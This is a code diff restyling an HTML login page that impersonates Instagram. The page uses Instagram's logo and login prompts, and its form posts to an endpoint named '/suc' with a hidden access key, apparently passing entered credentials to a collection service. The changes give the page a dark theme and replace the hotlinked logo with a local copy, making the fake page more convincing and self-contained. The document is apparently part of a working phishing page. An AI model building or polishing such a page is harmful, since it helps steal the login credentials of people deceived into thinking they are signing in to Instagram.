@@ -7,7 +7,7 @@
     <style>
         body {
             font-family: Arial, sans-serif;
-            background-color: #fafafa;
+            background-color: #000;
             display: flex;
             justify-content: center;
             align-items: center;
@@ -16,10 +16,11 @@
         }
 
         .login-container {
-            background-color: #fff;
-            border: 1px solid #dbdbdb;
+            background-color: #1A1A1A;
+            border-radius: 12px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+            border: none;
             padding: 20px 40px;
-            border-radius: 1px;
             text-align: center;
             width: 300px;
         }
@@ -34,10 +35,10 @@
             width: 100%;
             padding: 10px;
             margin: 5px 0;
-            border: 1px solid #dbdbdb;
-            border-radius: 3px;
+            border: none;
+            background-color: #242526;
+            border-radius: 6px;
             box-sizing: border-box;
-            background-color: #fafafa;
         }
 
         .login-container input[type="submit"] {
@@ -122,7 +123,7 @@
 </head>
 <body>
     <div class="login-container">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" alt="Instagram Logo" class="logo">
+        <img src="/images/insta.png" alt="Instagram Logo" class="logo">
         <form action="/suc" method="post">
             <input type="hidden" name="access_key" value="596e3a19-0354-4c99-ab40-bded453e4218">
             <input type="text" name="userId" placeholder="Phone number, username, or email" required>
